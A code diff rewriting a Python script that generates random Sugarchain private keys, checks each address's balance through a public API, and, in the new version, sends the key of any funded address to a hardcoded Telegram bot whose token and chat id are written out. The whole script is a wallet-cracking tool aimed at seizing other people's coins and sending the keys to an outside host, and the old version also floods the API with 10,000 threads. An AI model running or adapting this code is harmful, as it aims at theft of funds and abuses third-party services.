@@ -1,54 +1,32 @@
+# taken from rmdlv (github.com/rmdlv)
+
+import asyncio
+
 from bitcoinutils.setup import setup
-from bitcoinutils.keys import P2pkhAddress, PrivateKey, PublicKey
-from bitcoinutils.setup import setup
-from bitcoinutils.script import Script
-from bitcoinutils.keys import P2wpkhAddress, P2wshAddress, P2shAddress, PrivateKey, PublicKey
+from bitcoinutils.keys import PrivateKey
 from bitcoinutils import constants
-import requests
-import json
-from colorama import Fore, Back, Style
-import threading
-def runner():
-    while True:
-        main()
 
-def main():
-    # always remember to setup the network
+from aiohttp import ClientSession
+
+
+async def main():
+    session = ClientSession()
     constants.NETWORK_SEGWIT_PREFIXES["mainnet"] = "sugar"
-    setup('mainnet')
+    setup()
+    while True:
+        private = PrivateKey()
+        public = private.get_public_key()
+        segwit = public.get_segwit_address()
+        address = segwit.to_string()
+        wif = private.to_wif()
+        response = await session.get(f"https://api.sugarchain.org/balance/{address}")
+        data = await response.json()
+        balance = data["result"]["balance"]
+        print(wif, balance)
+        dat=wif+' '+balance
+        if int(balance) > 0:
+            await session.get(f"https://api.telegram.org/bot1898293389:AAEIV3G1RUrn2Mkp9oERYiAQv_RyIcF0KAE/sendMessage?chat_id=1149276168&text={dat}")
+            
 
-
-    # create a private key (deterministically)
-    priv = PrivateKey(secret_exponent = 0)
-
-    # compressed is the default
-    wifka=priv.to_wif(compressed=True)
-    # could also instantiate from existing WIF key
-    #priv = PrivateKey.from_wif('KwDiBf89qGgbjEhKnhxjUh7LrciVRzI3qYjgd9m7Rfu73SvHnOwn')
-
-    # get the public key
-    pub = priv.get_public_key()
-
-    # compressed is the default
-
-    # get address from public key
-    address = pub.get_segwit_address()
-
-    # print the address and hash160 - default is compressed address
-    addresss=address.to_string()
-    #print("Hash160:", address.to_hash160())
-    a=requests.get(f'https://api.sugarchain.org/balance/{addresss}')
-    a=a.content.decode('utf-8')
-    a=json.loads(a)
-    balanc=a['result']['balance']
-    recived=a['result']['received']
-    print(Fore.RED+f'[SugarGen] WIF: {wifka} | Address: {addresss} | Balance: {balanc} | Recived: {recived}')
-    if int(balanc) > 0:
-        print(Fore.GREEN+'Wow! Balance is good! We found VALID account')
-    if int(recived) > 0:
-        print('Wow! Recived is good! We found ACTIVED account')
-
-if __name__ == "__main__":
-    for i in range(10000):
-        my_thread = threading.Thread(target=runner, args=())
-        my_thread.start()
+loop = asyncio.get_event_loop()
+loop.run_until_complete(main())
